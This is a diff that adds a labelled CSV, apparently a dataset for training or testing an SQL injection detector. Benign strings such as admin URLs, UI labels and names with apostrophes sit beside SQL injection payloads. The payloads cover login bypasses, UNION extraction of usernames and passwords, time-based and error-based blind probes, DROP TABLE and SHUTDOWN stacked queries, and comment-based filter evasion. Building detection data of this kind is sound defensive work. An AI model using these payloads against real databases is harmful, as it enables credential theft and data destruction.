@@ -1,0 +1,1001 @@
+text,label
+/api/v1/admin?page=1,0
+site admin blocked the account,0
+"CHAR(117,115,101,114) UNION SELECT NULL --",1
+1 AND 1=(SELECT 1/0) #,1
+Open Admin View,0
+hello@work.co,0
+test.user@mail.org,0
+1; SHUTDOWN --,1
+' OR ASCII(CHAR(49))=49 --,1
+1 OR 1=1 --+,1
+Go to Admin,0
+request admin access from your manager,0
+'; CREATE DATABASE hacked --,1
+settings saved,0
+' AND 1=1 --,1
+admin panel is available to staff only,0
+O'Reilly,0
+"'; SELECT CHAR(65,68,77,73,78) --",1
+/*!50000SELECT*/ 1 --,1
+' OR CHAR(49)=CHAR(49) /**/,1
+Admin Menu,0
+admin' /**/,1
+Smith's profile,0
+' OR '1'='1 #,1
+' OR CHAR(49)=CHAR(49) #,1
+/admin/settings/create,0
+Admin Settings,0
+'; CREATE DATABASE hacked --,1
+admin interface is on a separate subdomain,0
+password changed,0
+"' UNION SELECT null,null,null --+",1
+' OR 1=1 /**/,1
+O'Brien,0
+email verified,0
+'/*!50000OR*/2>1 --,1
+/user/admin,0
+'; CREATE TABLE tmp (id INT) --,1
+' AND SLEEP(6) #,1
+O'Brien,0
+"' AND UPDATEXML(1,CONCAT(0x7e,user()),1) --",1
+/*!50000UNION*//*!50000SELECT*/ null --,1
+1 AND 1=(SELECT 1/0) --,1
+' AND 1=1 --+,1
+the admin changed the password policy,0
+'; CREATE TABLE backdoor (cmd TEXT) --,1
+'/*!OR*/1=1 --,1
+'/*!OR*/1=1 --,1
+admin credentials are stored securely,0
+' AND CHAR(48)=CHAR(48) --,1
+"' UNION SELECT CHAR(117,115,101,114) --",1
+"CHAR(117,115,101,114) UNION SELECT NULL --",1
+/admin/settings/delete,0
+1; SHUTDOWN --,1
+/admin/?page=1,0
+phone case,0
+"' AND gtid_subset(version(),0) #",1
+' OR/*! */1=1 --,1
+customer's address,0
+request admin access from your manager,0
+/admin/reports#settings,0
+"CHAR(117,115,101,114) UNION SELECT NULL --",1
+admin rights have been revoked,0
+1'; CREATE TABLE log2 (ts DATETIME) --,1
+1 AND 1=(SELECT 1/0) --+,1
+carol_m,0
+"' UNION SELECT null,null --",1
+wireless keyboard,0
+admin' --,1
+Admin Dashboard,0
+'/*!50000OR*/2>1 --,1
+' /*!50000UNION*/ /*!50000SELECT*/ NULL --,1
+"' UNION SELECT CHAR(97,100,109,105,110) --",1
+/admin/api/edit,0
+Admin Reports,0
+'; CREATE DATABASE test2 --,1
+site admin blocked the account,0
+' OR 1=1 --+,1
+don't show this,0
+don't show this,0
+' OR CHAR(49)>CHAR(48) --,1
+we've confirmed,0
+"'; CREATE TABLE shell (cmd TEXT, out TEXT) --",1
+that's the admin page,0
+yesterday's orders,0
+admin' AND CHAR(49)=CHAR(49) --,1
+"1' AND ORD(SUBSTR(username,1,1))>64 /**/",1
+' AND 1=1 --+,1
+' AND SLEEP(8) #,1
+this page requires admin role,0
+' OR 2=2 --,1
+/admin/api,0
+"'; SHUTDOWN; INSERT INTO users VALUES(1,'hacker') --",1
+heidip,0
+yesterday's orders,0
+1; SELECT version() #,1
+' AND 1=1 #,1
+here's the admin link,0
+"'; SHUTDOWN; INSERT INTO users VALUES(1,'hacker') --",1
+it's working,0
+' AND length(username)>7 #,1
+user@example.com,0
+frank_b,0
+admin's note,0
+66280,0
+Admin Home,0
+it's working,0
+' /*!50000OR*/ '1'='1 --,1
+desk lamp,0
+49929,0
+running shoes,0
+subscription renewed,0
+admin credentials are stored securely,0
+'; SHUTDOWN --,1
+'; SHUTDOWN; DROP TABLE users --,1
+this page requires admin role,0
+wireless keyboard,0
+Admin Tools,0
+CHAR(39) OR CHAR(49)=CHAR(49) --,1
+' /*!50000OR*/ '1'='1 --,1
+admin'/*!50000--*/,1
+1/*!50000OR*/2>1 --,1
+test.user@mail.org,0
+"'; CREATE TABLE tmp2 (x TEXT, y TEXT) --",1
+Admin Reports,0
+profile updated,0
+store admin manages product listings,0
+/admin/?page=1,0
+the admin user was created successfully,0
+/api/v1/admin/view,0
+1 AND 1=(SELECT 1/0) #,1
+O'Brien,0
+'; CREATE DATABASE test2 --,1
+1 AND SLEEP(6) --+,1
+D'Angelo,0
+' OR CHAR(49)=CHAR(49) --,1
+we've confirmed,0
+Admin,0
+"' AND substring(username,1,1)='a' #",1
+' AND exp(~(SELECT*FROM(SELECT version())a)) #,1
+'; CREATE DATABASE test2 --,1
+' OR 1=1 --,1
+1 AND CHAR(49)=CHAR(49) --,1
+"' UNION SELECT CHAR(117,115,101,114) --",1
+notebook,0
+/admin/dashboard?page=1,0
+' AND exp(~(SELECT*FROM(SELECT version())a)) --,1
+' OR 1=1 /**/,1
+item added to cart,0
+view admin activity log,0
+O'Neill's order,0
+admin tools are under maintenance,0
+admin access granted,0
+frank_b,0
+Back to Admin,0
+Admin Console,0
+'/*!50000OR*/1=1 --,1
+Store Admin,0
+customer's address,0
+'/*!50000OR*/2>1 --,1
+'; SHUTDOWN; DROP TABLE users --,1
+"' UNION SELECT null,null /**/",1
+Admin Tools,0
+x'; CREATE TABLE tokens (tok TEXT) --,1
+"'; SHUTDOWN; INSERT INTO users VALUES(1,'hacker') --",1
+'/*!50000OR*//*!50000'1'*/=/*!50000'1'*/ --,1
+1 OR CHAR(49)=CHAR(49) --,1
+' OR '1'='1 --+,1
+' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1 --+,1
+admin' AND CHAR(49)=CHAR(49) --,1
+/admin/panel?page=1,0
+Site Admin,0
+O'Brien,0
+1/*!50000OR*/2>1 --,1
+' /*!50000OR*/ 1/*!50000=*/1 --,1
+'/*!50000OR*/2>1 --,1
+/admin/reports?page=1,0
+helpdesk admin opened the ticket,0
+' OR 1=1 --+,1
+' /*!AND*/ '1'='1 --,1
+Admin Home,0
+"'; SHUTDOWN; INSERT INTO users VALUES(1,'hacker') --",1
+'/*!50000UNION*//*!50000SELECT*/ user() --,1
+"UN/*!50000ION*/ SE/*!50000LECT*/ null,null --",1
+"'; SHUTDOWN; INSERT INTO users VALUES(1,'hacker') --",1
+' AND CHAR(48)=CHAR(48) --,1
+/admin/logs?page=1,0
+order placed,0
+"1' AND ORD(SUBSTR(username,1,1))>64 --",1
+/admin/api?page=1,0
+' /*!50000OR*/ 1/*!50000=*/1 --,1
+O'Sullivan,0
+Admin Console,0
+/admin/settings?page=1,0
+Admin Notifications,0
+'/*!50000OR*//*!50000'1'*/=/*!50000'1'*/ --,1
+/admin/view,0
+admin-only feature flag enabled,0
+/admin/?tab=overview,0
+'; CREATE DATABASE test2 --,1
+Smith's profile,0
+' AND length(username)>4 --+,1
+' OR (SELECT COUNT(*) FROM users WHERE username='admin')>0 --+,1
+O'Reilly,0
+the admin dashboard shows usage stats,0
+/*!50000DROP*/ TABLE users --,1
+51155,0
+"'; SHUTDOWN; INSERT INTO users VALUES(1,'hacker') --",1
+today's date,0
+' AND length(username)>2 #,1
+"' UNION SELECT null,null --",1
+"' UNION SELECT CHAR(117,115,101,114) #",1
+/admin/logs#settings,0
+support@help.org,0
+D'Angelo,0
+Admin Console,0
+User Admin,0
+' OR CHAR(49)>CHAR(48) --,1
+' OR '1'='1 --,1
+ivanm,0
+' OR /*!50000 1 */=/*!50000 1 */ --,1
+1 OR CHAR(49)=CHAR(49) --,1
+Smith's profile,0
+' OR 5=5 #,1
+"'; CREATE TABLE tmp2 (x TEXT, y TEXT) --",1
+only admin accounts can export data,0
+D'Angelo,0
+"' AND BENCHMARK(600000,SHA1('a')) /**/",1
+admin rights have been revoked,0
+/admin/dashboard#settings,0
+judy_k,0
+D'Arcy,0
+"' UNION SELECT CHAR(118,101,114,115,105,111,110) --",1
+cloud admin portal login,0
+the admin changed the password policy,0
+/admin/reports,0
+1; CREATE TABLE evil (pass TEXT) --,1
+'; SHUTDOWN --,1
+Admin Console,0
+' /*!50000OR*/ 1/*!50000=*/1 --,1
+1 OR CHAR(49)=CHAR(49) --,1
+"' UNION SELECT NULL,CHAR(117,115,101,114) --",1
+"' UNION SELECT null,null /**/",1
+test.user@mail.org,0
+'; CREATE TABLE tmp (id INT) --,1
+Admin,0
+"' UNION SELECT CHAR(118,101,114,115,105,111,110) --",1
+'; CREATE TABLE backdoor (cmd TEXT) --,1
+O'Brien,0
+D'Angelo,0
+1'; CREATE TABLE log2 (ts DATETIME) --,1
+"' AND BENCHMARK(600000,SHA1('a')) #",1
+Admin Console,0
+' OR /*!50000 1 */=/*!50000 1 */ --,1
+"'; CREATE TABLE shell (cmd TEXT, out TEXT) --",1
+' OR 6=6 --+,1
+"1' AND ORD(SUBSTR(username,1,1))>64 --+",1
+'; CREATE TABLE tmp (x TEXT) --,1
+"'; SELECT CHAR(65,68,77,73,78) --",1
+contact the system administrator,0
+48933,0
+' AND exp(~(SELECT*FROM(SELECT version())a)) #,1
+/admin/#settings,0
+/staff/admin,0
+' AND CHAR(48)=CHAR(48) --,1
+hello@work.co,0
+we've confirmed,0
+admin can unlock any account,0
+request admin access from your manager,0
+' OR (SELECT COUNT(*) FROM users WHERE username='admin')>0 --,1
+that's the admin page,0
+' /*!AND*/ '1'='1 --,1
+1' OR '1'='1 --+,1
+heidip,0
+' AND exp(~(SELECT*FROM(SELECT version())a)) --+,1
+ivanm,0
+admin account set up complete,0
+admin-only feature flag enabled,0
+email verified,0
+Go to Admin,0
+"UN/*!50000ION*/ SE/*!50000LECT*/ null,null --",1
+/manage/admin/view,0
+'; CREATE DATABASE hacked --,1
+' AND length(username)>6 --+,1
+admin can unlock any account,0
+/admin/panel/create,0
+"' UNION SELECT null,null,null --+",1
+admin panel is available to staff only,0
+1; SHUTDOWN --,1
+here's the admin link,0
+admin' --,1
+' /*!50000UNION*/ /*!50000SELECT*/ NULL --,1
+admin portal requires two-factor auth,0
+it's working,0
+Store Admin,0
+1; CREATE TABLE evil (pass TEXT) --,1
+' OR /*!50000 1 */=/*!50000 1 */ --,1
+/admin/logs/delete,0
+/admin/api/edit,0
+' /*!50000OR*/ '1'='1 --,1
+D'Arcy,0
+eve123,0
+admin@example.org sent a notification,0
+'; CREATE DATABASE test2 --,1
+'; SHUTDOWN; DROP TABLE users --,1
+' OR 1=1 --,1
+D'Angelo,0
+contact@demo.net,0
+' AND 1=1 --,1
+' OR (SELECT COUNT(*) FROM users WHERE username='admin')>0 --,1
+the admin dashboard shows usage stats,0
+User Admin,0
+helpdesk admin opened the ticket,0
+1; SELECT version() /**/,1
+' /*!AND*/ '1'='1 --,1
+"' UNION SELECT CHAR(97,100,109,105,110) --",1
+CHAR(39) OR CHAR(49)=CHAR(49) --,1
+1' OR '1'='1 --+,1
+'; CREATE DATABASE test2 --,1
+/admin/users#settings,0
+reset via the admin console,0
+"'; CREATE TABLE shell (cmd TEXT, out TEXT) --",1
+admin' --,1
+/*!50000DROP*/ TABLE users --,1
+' AND exp(~(SELECT*FROM(SELECT version())a)) --,1
+1/*!50000AND*/SLEEP(0) --,1
+subscription renewed,0
+O'Reilly,0
+31140,0
+phone case,0
+"' UNION SELECT CHAR(117,115,101,114) --",1
+/admin/dashboard,0
+"' UNION SELECT CHAR(118,101,114,115,105,111,110) --",1
+don't show this,0
+1 AND SLEEP(4) --+,1
+/admin/logs/list,0
+'; SHUTDOWN --+,1
+/*!50000SELECT*/ 1 --,1
+/admin/reports/view,0
+55588,0
+Admin Login,0
+we've confirmed,0
+'/*!50000UNION*//*!50000SELECT*/ user() --,1
+Product Admin,0
+'; CREATE TABLE tmp (x TEXT) --,1
+' OR '1'='1 /**/,1
+helpdesk admin opened the ticket,0
+'; CREATE DATABASE test2 --,1
+1/*!50000OR*/2>1 --,1
+' OR CHAR(49)=CHAR(49) #,1
+"' AND ASCII(SUBSTRING(password,1,1))>64 #",1
+Admin Login,0
+"' OR CHAR(49,48)=CHAR(49,48) --",1
+"'; CREATE TABLE shell (cmd TEXT, out TEXT) --",1
+"'; CREATE TABLE tmp2 (x TEXT, y TEXT) --",1
+' AND 1=1 /**/,1
+"' AND gtid_subset(version(),0) --+",1
+'; SHUTDOWN; DROP TABLE users --,1
+/admin/edit,0
+the admin changed the password policy,0
+payment confirmed,0
+"' UNION SELECT NULL,CHAR(117,115,101,114) --",1
+' OR /*!50000 1 */=/*!50000 1 */ --,1
+"' AND gtid_subset(version(),0) /**/",1
+' /*!50000OR*/ '1'='1 --,1
+I'm logged in,0
+here's the admin link,0
+1 AND (SELECT COUNT(*) FROM users)>0 --+,1
+updated by admin on Monday,0
+' AND CHAR(49)=CHAR(49) --,1
+D'Arcy,0
+' OR /*!50000 1 */=/*!50000 1 */ --,1
+' OR '1'='1 /**/,1
+"'; SHUTDOWN; INSERT INTO users VALUES(1,'hacker') --",1
+1 AND CHAR(49)=CHAR(49) --,1
+1 OR 1=1; SHUTDOWN #,1
+/staff/admin/view,0
+/admin/dashboard/delete,0
+this page requires admin role,0
+"' AND gtid_subset(version(),0) #",1
+O'Connor's account,0
+admin group includes three members,0
+Admin Panel,0
+1 AND CHAR(49)=CHAR(49) --,1
+1 AND SLEEP(1) /**/,1
+' AND (SELECT table_name FROM information_schema.tables LIMIT 1)='users' #,1
+1 AND (SELECT COUNT(*) FROM users)>0 --,1
+admin role was assigned,0
+' OR '1'='1 --+,1
+travel mug,0
+' /*!AND*/ '1'='1 --,1
+"' UNION SELECT null,null #",1
+"' UNION SELECT CHAR(117,115,101,114) --",1
+'/*!*/OR/*! */1=1 --,1
+Back to Admin,0
+'; CREATE TABLE tmp (x TEXT) --,1
+it's working,0
+' /*!AND*/ '1'='1 --,1
+' /*!50000OR*/ 1/*!50000=*/1 --,1
+this page requires admin role,0
+User Admin,0
+running shoes,0
+"' AND gtid_subset(version(),0) /**/",1
+Admin Portal,0
+you're registered,0
+' AND length(username)>4 --+,1
+'/*!*/OR/*! */1=1 --,1
+/manage/admin#settings,0
+1/*!50000AND*/1=1 --,1
+1 AND EXISTS(SELECT * FROM users) --+,1
+/admin/?tab=overview,0
+"' UNION SELECT CHAR(97,100,109,105,110) --",1
+it's working,0
+' AND CHAR(48)=CHAR(48) --,1
+' AND 1=1 #,1
+updated by admin on Monday,0
+Super Admin,0
+"' UNION SELECT CHAR(118,101,114,115,105,111,110) --",1
+"1' AND ORD(SUBSTR(username,1,1))>64 #",1
+' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1 --,1
+admin'; SHUTDOWN --,1
+/*!50000UNION*//*!50000SELECT*/ null --,1
+"'; CREATE TABLE tmp2 (x TEXT, y TEXT) --",1
+' OR (SELECT COUNT(*) FROM users WHERE username='admin')>0 --+,1
+today's date,0
+order placed,0
+admin-only feature flag enabled,0
+Super Admin,0
+site admin blocked the account,0
+Open Admin View,0
+the admin dashboard shows usage stats,0
+1' OR '1'='1 /**/,1
+' AND exp(~(SELECT*FROM(SELECT version())a)) --,1
+item added to cart,0
+' OR /*!50000 1 */=/*!50000 1 */ --,1
+/user/admin,0
+1; CREATE TABLE evil (pass TEXT) --,1
+Store Admin,0
+' OR CHAR(49)>CHAR(48) --,1
+'/*!50000OR*/1=1 --,1
+test.user@mail.org,0
+' AND 1=1 --,1
+admin portal requires two-factor auth,0
+admin role was assigned,0
+item added to cart,0
+Admin Login,0
+site admin blocked the account,0
+1; SHUTDOWN --,1
+"' AND ASCII(SUBSTRING(password,1,1))>64 --+",1
+Admin Console,0
+Admin Dashboard,0
+'/*!*/OR/*! */1=1 --,1
+1 AND (SELECT COUNT(*) FROM users)>0 --,1
+user@example.com,0
+"' AND ASCII(SUBSTRING(password,1,1))>64 /**/",1
+' AND 1=1 --,1
+/admin/dashboard/view,0
+admin account set up complete,0
+/admin/dashboard/view,0
+coffee table,0
+User Admin,0
+1'; CREATE TABLE log2 (ts DATETIME) --,1
+1; SHUTDOWN --,1
+1 OR CHAR(49)=CHAR(49) --,1
+'/*!50000UNION*//*!50000SELECT*/ user() --,1
+admin credentials are stored securely,0
+"'; SHUTDOWN; INSERT INTO users VALUES(1,'hacker') --",1
+'; CREATE TABLE tmp (x TEXT) --,1
+password changed,0
+/admin/,0
+' OR 'x'='x /**/,1
+D'Angelo,0
+the admin user was created successfully,0
+1 OR CHAR(49)=CHAR(49) --,1
+Admin Dashboard,0
+' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1 /**/,1
+here's the admin link,0
+' /*!50000OR*/ 1/*!50000=*/1 --,1
+' OR 1=CHAR(49)-CHAR(48) --,1
+/*!50000SELECT*/ 1 --,1
+forum admin moderates posts,0
+/manage/admin/list,0
+' OR 1=CHAR(49)-CHAR(48) --,1
+grace.h,0
+Admin Menu,0
+user's cart,0
+' OR 1=1 /**/,1
+Admin Portal,0
+1 AND (SELECT COUNT(*) FROM users)>0 --,1
+"' AND substring(username,1,1)='a' #",1
+1/*!50000OR*/2>1 --,1
+'; CREATE TABLE tmp (id INT) --,1
+Product Admin,0
+Store Admin,0
+yesterday's orders,0
+contact your admin for help,0
+"'; SELECT CHAR(65,68,77,73,78) --",1
+/admin#settings,0
+test.user@mail.org,0
+Admin Menu,0
+' OR CHAR(49)=CHAR(49) /**/,1
+1 AND SLEEP(9) --,1
+/user/admin?tab=overview,0
+1 AND 1=(SELECT 1/0) --+,1
+address updated,0
+"'; CREATE TABLE shell (cmd TEXT, out TEXT) --",1
+/user/admin?tab=overview,0
+administrator email is admin@company.com,0
+1' OR '1'='1 --+,1
+1 AND 1=(SELECT 1/0) --+,1
+'; SHUTDOWN; DROP TABLE users --,1
+1 OR CHAR(49)=CHAR(49) --,1
+grant admin role to power users,0
+admin role was assigned,0
+' OR '1'='1 /**/,1
+logged in as administrator,0
+database admin approved the change,0
+'/*!50000OR*/1=1 --,1
+admin'; SHUTDOWN --,1
+/admin//list,0
+yesterday's orders,0
+Admin Portal,0
+Admin Home,0
+view admin activity log,0
+' /*!50000UNION*/ /*!50000SELECT*/ NULL --,1
+"' OR CHAR(49,48)=CHAR(49,48) --",1
+site admin blocked the account,0
+Admin Reports,0
+"' UNION SELECT CHAR(97,100,109,105,110) --",1
+1/*!50000AND*/1=1 --,1
+Store Admin,0
+1'; CREATE TABLE log2 (ts DATETIME) --,1
+"' UNION SELECT null,null --",1
+' AND (SELECT table_name FROM information_schema.tables LIMIT 1)='users' #,1
+' OR 'x'='x /**/,1
+contact@demo.net,0
+"' AND gtid_subset(version(),0) --+",1
+'; SHUTDOWN --,1
+/manage/admin/list,0
+' AND SLEEP(9) /**/,1
+contact your admin for help,0
+O'Reilly,0
+super admin can manage all users,0
+x'; CREATE TABLE tokens (tok TEXT) --,1
+Admin,0
+1 AND EXISTS(SELECT * FROM users) #,1
+hello@work.co,0
+Admin Settings,0
+O'Reilly,0
+User Admin,0
+'/*!OR*/1=1 --,1
+' /*!50000OR*/ '1'='1 --,1
+"' AND substring(username,1,1)='a' --",1
+"1' AND ORD(SUBSTR(username,1,1))>64 #",1
+Admin,0
+item added to cart,0
+"'; CREATE TABLE tmp2 (x TEXT, y TEXT) --",1
+"'; SHUTDOWN; INSERT INTO users VALUES(1,'hacker') --",1
+O'Sullivan,0
+1 OR 1=1 #,1
+co-admin has limited privileges,0
+1/*!50000OR*/2>1 --,1
+helpdesk admin opened the ticket,0
+' OR CHAR(49)=CHAR(49) /**/,1
+' AND length(username)>5 --+,1
+customer's address,0
+Smith's profile,0
+"' UNION SELECT CHAR(97,100,109,105,110) --",1
+order placed,0
+' /*!50000OR*/ 1/*!50000=*/1 --,1
+'; CREATE TABLE tmp (x TEXT) --,1
+"' AND UPDATEXML(1,CONCAT(0x7e,user()),1) #",1
+that's the admin page,0
+"' UNION SELECT CHAR(118,101,114,115,105,111,110) --",1
+subscription renewed,0
+admin privileges are required for this action,0
+'; CREATE TABLE tmp (x TEXT) --,1
+travel mug,0
+"' UNION SELECT null,null,null --+",1
+"' UNION SELECT username,password FROM users /**/",1
+password changed,0
+Product Admin,0
+1'; CREATE TABLE log2 (ts DATETIME) --,1
+/admin/panel/view,0
+I am the server admin,0
+you're registered,0
+' OR CHAR(49)=CHAR(49) #,1
+' AND length(username)>2 #,1
+Super Admin,0
+/admin/dashboard?page=1,0
+1 AND SLEEP(9) --+,1
+Back to Admin,0
+' AND 1=1 /**/,1
+"' AND substring(username,1,1)='a' --",1
+Admin Menu,0
+"' AND ASCII(SUBSTRING(password,1,1))>64 --",1
+'; CREATE DATABASE hacked --,1
+I'm logged in,0
+grace.h,0
+/admin/reports#settings,0
+the admin user was created successfully,0
+O'Reilly,0
+/admin/logs#settings,0
+' OR CHAR(49)=CHAR(49) /**/,1
+/staff/admin#settings,0
+admin' /**/,1
+"' AND UPDATEXML(1,CONCAT(0x7e,user()),1) --+",1
+'; DROP TABLE users --,1
+admin-only feature flag enabled,0
+phone case,0
+1'; CREATE TABLE log2 (ts DATETIME) --,1
+/manage/admin/delete,0
+view admin activity log,0
+account created,0
+hello@work.co,0
+1 AND CHAR(49)=CHAR(49) --,1
+D'Arcy,0
+Admin Settings,0
+Admin Reports,0
+Store Admin,0
+admin' AND CHAR(49)=CHAR(49) --,1
+admin' --+,1
+admin' AND CHAR(49)=CHAR(49) --,1
+password changed,0
+/admin/api/edit,0
+"' UNION SELECT CHAR(117,115,101,114) --",1
+x'; CREATE TABLE tokens (tok TEXT) --,1
+/admin/settings?tab=overview,0
+1 AND EXISTS(SELECT * FROM users) --,1
+"' UNION SELECT null,null --",1
+/staff/admin?page=1,0
+/admin/reports/list,0
+"'; CREATE TABLE shell (cmd TEXT, out TEXT) --",1
+/admin/delete,0
+/api/v1/admin?tab=overview,0
+Admin,0
+"UN/*!50000ION*/ SE/*!50000LECT*/ null,null --",1
+78934,0
+user's cart,0
+Admin Home,0
+"' UNION SELECT null,null --",1
+'/*!OR*/1=1 --,1
+O'Brien,0
+' AND exp(~(SELECT*FROM(SELECT version())a)) --,1
+' OR/*! */1=1 --,1
+Admin Dashboard,0
+your administrator account is active,0
+'; CREATE DATABASE hacked --,1
+'; CREATE DATABASE test2 --,1
+"' UNION SELECT CHAR(118,101,114,115,105,111,110) --",1
+/manage/admin?tab=overview,0
+phone case,0
+' OR 'x'='x /**/,1
+request admin access from your manager,0
+36594,0
+admin interface is on a separate subdomain,0
+hello@work.co,0
+Admin Tools,0
+O'Neill's order,0
+"' UNION SELECT CHAR(117,115,101,114) #",1
+that's the admin page,0
+logged in as administrator,0
+Admin Login,0
+admin' AND CHAR(49)=CHAR(49) --,1
+/manage/admin?page=1,0
+/admin/panel?tab=overview,0
+"' AND ASCII(SUBSTRING(password,1,1))>64 #",1
+/admin/logs/create,0
+"' UNION SELECT CHAR(118,101,114,115,105,111,110) --",1
+'/*!50000OR*/1=1 --,1
+' AND (SELECT table_name FROM information_schema.tables LIMIT 1)='users' #,1
+'/*!50000UNION*//*!50000SELECT*/ user() --,1
+admin'; SHUTDOWN --,1
+/staff/admin/view,0
+Admin Login,0
+Admin Portal,0
+/user/admin/delete,0
+grant admin role to power users,0
+/admin?tab=overview,0
+O'Brien,0
+' OR CHAR(49)=CHAR(49) /**/,1
+we've confirmed,0
+'; SHUTDOWN; --,1
+1 AND SLEEP(9) --,1
+"' UNION SELECT null,null --",1
+/admin/reports?tab=overview,0
+Admin Portal,0
+' /*!50000OR*/ '1'='1 --,1
+"' UNION SELECT NULL,CHAR(117,115,101,114) --",1
+' /*!50000OR*/ '1'='1 --,1
+admin' /**/,1
+"CHAR(117,115,101,114) UNION SELECT NULL --",1
+"'; SHUTDOWN; INSERT INTO users VALUES(1,'hacker') --",1
+' OR CHAR(49)>CHAR(48) --,1
+1 OR CHAR(49)=CHAR(49) --,1
+"' UNION SELECT CHAR(117,115,101,114) --",1
+"' UNION SELECT null,null /**/",1
+view admin activity log,0
+"' AND BENCHMARK(500000,SHA1('a')) #",1
+Super Admin,0
+Store Admin,0
+Admin Console,0
+"' UNION SELECT CHAR(117,115,101,114) --",1
+Admin Reports,0
+hello@work.co,0
+'; CREATE TABLE tmp (x TEXT) --,1
+admin's note,0
+/admin//create,0
+we've confirmed,0
+"UN/*!50000ION*/ SE/*!50000LECT*/ null,null --",1
+"' UNION SELECT username,password FROM users /**/",1
+1; CREATE TABLE evil (pass TEXT) --,1
+89357,0
+"UN/*!50000ION*/ SE/*!50000LECT*/ null,null --",1
+"' AND EXTRACTVALUE(1,CONCAT(0x7e,version())) #",1
+1 AND (SELECT COUNT(*) FROM users)>0 --,1
+/*!50000DROP*/ TABLE users --,1
+1 AND EXISTS(SELECT * FROM users) /**/,1
+"1' AND ORD(SUBSTR(username,1,1))>64 #",1
+"UN/*!50000ION*/ SE/*!50000LECT*/ null,null --",1
+'; CREATE TABLE tmp (id INT) --,1
+'; CREATE DATABASE hacked --,1
+1 AND CHAR(49)=CHAR(49) --,1
+/*!50000UNION*//*!50000SELECT*/ null --,1
+' OR CHAR(49)>CHAR(48) --,1
+' AND exp(~(SELECT*FROM(SELECT version())a)) /**/,1
+' /*!50000UNION*/ /*!50000SELECT*/ NULL --,1
+' AND CHAR(49)=CHAR(49) --,1
+admin account set up complete,0
+5343,0
+/admin/api/view,0
+travel mug,0
+' AND exp(~(SELECT*FROM(SELECT version())a)) /**/,1
+today's date,0
+Go to Admin,0
+I am the server admin,0
+' AND 1=1 /**/,1
+this page requires admin role,0
+' OR 1=1 --+,1
+address updated,0
+"' AND substring(username,1,1)='a' #",1
+Admin Reports,0
+O'Connor's account,0
+' AND SLEEP(6) --,1
+user's cart,0
+travel mug,0
+email verified,0
+1 AND 1=(SELECT 1/0) --,1
+'; CREATE DATABASE hacked --,1
+"' UNION SELECT CHAR(117,115,101,114) --",1
+/staff/admin#settings,0
+hello@work.co,0
+"' AND UPDATEXML(1,CONCAT(0x7e,user()),1) --+",1
+'/*!50000OR*/1=1 --,1
+/admin/dashboard/delete,0
+"' UNION SELECT username,password FROM users --+",1
+password changed,0
+Store Admin,0
+' AND SLEEP(3) --,1
+' OR /*!50000 1 */=/*!50000 1 */ --,1
+Smith's profile,0
+/user/admin/list,0
+"' AND BENCHMARK(700000,SHA1('a')) #",1
+1 OR 1=1 --,1
+/admin/logs/view,0
+' AND 1=1 #,1
+admin'/*!50000--*/,1
+O'Sullivan,0
+admin can unlock any account,0
+/staff/admin/list,0
+phone case,0
+/*!50000SELECT*/ 1 --,1
+1/*!50000AND*/SLEEP(0) --,1
+admin approved the request,0
+"' UNION SELECT null,null /**/",1
+O'Sullivan,0
+1 AND 1=(SELECT 1/0) #,1
+O'Sullivan,0
+'; CREATE TABLE backdoor (cmd TEXT) --,1
+that's the admin page,0
+1 AND SLEEP(1) /**/,1
+'; CREATE TABLE tmp (id INT) --,1
+/admin?page=1,0
+admin' AND CHAR(49)=CHAR(49) --,1
+you're registered,0
+"'; CREATE TABLE tmp2 (x TEXT, y TEXT) --",1
+' /*!50000UNION*/ /*!50000SELECT*/ NULL --,1
+"' AND EXTRACTVALUE(1,CONCAT(0x7e,version())) /**/",1
+1; SHUTDOWN --,1
+'; CREATE TABLE tmp (id INT) --,1
+yesterday's orders,0
+Open Admin View,0
+' OR 1=1 #,1
+the admin dashboard shows usage stats,0
+Go to Admin,0
+' /*!50000UNION*/ /*!50000SELECT*/ NULL --,1
+Admin Portal,0
+hello@work.co,0
+"CHAR(117,115,101,114) UNION SELECT NULL --",1
+' OR CHAR(49)>CHAR(48) --,1
+Admin Notifications,0
+Back to Admin,0
+/admin/api/list,0
+1; SELECT version() /**/,1
+/api/v1/admin/edit,0
+58655,0
+"UN/*!50000ION*/ SE/*!50000LECT*/ null,null --",1
+1; CREATE TABLE evil (pass TEXT) --,1
+"' UNION SELECT CHAR(117,115,101,114) #",1
+1 AND (SELECT COUNT(*) FROM users)>0 --,1
+/admin/list,0
+customer's address,0
+coffee table,0
+today's date,0
+admin'/*!50000--*/,1
+/admin//delete,0
+I'm logged in,0
+user's cart,0
+/admin/api/delete,0
+Admin Dashboard,0
+test.user@mail.org,0
+admin credentials are stored securely,0
+admin@example.org sent a notification,0
+that's the admin page,0
+1 OR 1=1 #,1
+info@sample.io,0
+"' AND gtid_subset(version(),0) #",1
+admin role was assigned,0
+'; DROP TABLE users /**/,1
+O'Connor's account,0
+'; SHUTDOWN; --,1
+' OR '1'='1 --,1
+Super Admin,0
+1 OR CHAR(49)=CHAR(49) --,1
+' AND exp(~(SELECT*FROM(SELECT version())a)) --,1
+Admin Notifications,0
+59247,0
+'; CREATE DATABASE hacked --,1
+1 AND EXISTS(SELECT * FROM users) /**/,1
+don't show this,0
+' AND SLEEP(2) #,1
+' OR /*!50000 1 */=/*!50000 1 */ --,1
+cloud admin portal login,0
+admin' AND CHAR(49)=CHAR(49) --,1
+/*!50000SELECT*/ 1 --,1
+' AND (SELECT 1 FROM information_schema.tables LIMIT 1)=1 --,1
+Back to Admin,0
+"' AND EXTRACTVALUE(1,CONCAT(0x7e,version())) /**/",1
+1 AND EXISTS(SELECT * FROM users) #,1
+"' UNION SELECT NULL,CHAR(117,115,101,114) --",1
+'; CREATE TABLE backdoor (cmd TEXT) --,1
+"' OR CHAR(49,48)=CHAR(49,48) --",1
+'; DROP TABLE users /**/,1
+"' UNION SELECT NULL,CHAR(117,115,101,114) --",1
+I'm logged in,0
+"' UNION SELECT CHAR(118,101,114,115,105,111,110) --",1
+/admin//delete,0
+"' UNION SELECT CHAR(117,115,101,114) --",1
+"UN/*!50000ION*/ SE/*!50000LECT*/ null,null --",1
+' OR/*! */1=1 --,1
+"' UNION SELECT null,null,null --+",1
+"'; CREATE TABLE tmp2 (x TEXT, y TEXT) --",1
+Admin Portal,0
+O'Reilly,0
+Admin,0
+' OR 1=1; SHUTDOWN --,1
+ivanm,0
+' OR CHAR(49)=CHAR(49) --,1
+admin tools are under maintenance,0
+' /*!50000OR*/ '1'='1 --,1
+1 OR CHAR(49)=CHAR(49) --,1
+/api/v1/admin/create,0
